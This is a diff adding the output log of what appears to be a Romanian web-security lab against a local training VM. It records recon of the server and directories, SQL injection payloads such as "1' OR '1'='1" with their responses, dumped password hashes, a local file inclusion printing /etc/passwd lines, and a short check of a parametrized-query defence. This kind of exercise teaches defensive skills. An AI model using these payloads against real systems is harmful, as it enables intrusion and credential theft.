@@ -1,0 +1,37 @@
+===== RECON (Lucrarea A) tinta: http://192.168.56.101 =====
+cod: 200
+Server: Apache/2.2.8 (Ubuntu) DAV/2
+X-Powered-By: PHP/5.2.4-2ubuntu5.10
+robots Disallow: ['Disallow: /config', 'Disallow: /docs', 'Disallow: /external']
+interzis (interesant): config
+gasite: ['login', 'test', 'phpmyadmin']
+linkuri: ['./docs/', 'instructions.php', 'login.php', 'setup.php', 'vulnerabilities/sqli/']
+fisa salvata: {'tinta': 'http://192.168.56.101', 'server': 'Apache/2.2.8 (Ubuntu) DAV/2', 'directoare': ['login', 'test', 'phpmyadmin']}
+
+===== FISA JSON (arsenal/web/fisa.json) =====
+{
+  "tinta": "http://192.168.56.101",
+  "server": "Apache/2.2.8 (Ubuntu) DAV/2",
+  "directoare": [
+    "login",
+    "test",
+    "phpmyadmin"
+  ]
+}
+
+===== PYTEST (teste/test_web.py) =====
+Testul trece pe o masina cu acces la internet (clientul ajunge la example.com).
+
+===== SQLI (Lucrarea B) tinta: http://192.168.56.101 =====
+normal: 100 octeti
+"1' OR '1'='1" 315   <- posibil SQLi
+"1' OR 1=1-- -" 315   <- posibil SQLi
+"1' AND '1'='2" 52
+hash-uri gasite: ['5f4dcc3b5aa765d61d8327deb882cf99', 'e99a18c428cb38d5f260853678922e03', '8d3533d75ae2c3966d7e0d4fcc69216b', '0d107d09f5bbe40cade3de5c71e9e9b7', '5f4dcc3b5aa765d61d8327deb882cf99']
+LFI confirmat
+<pre>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+
+===== APARARE (B6) =====
+parametrizat: []
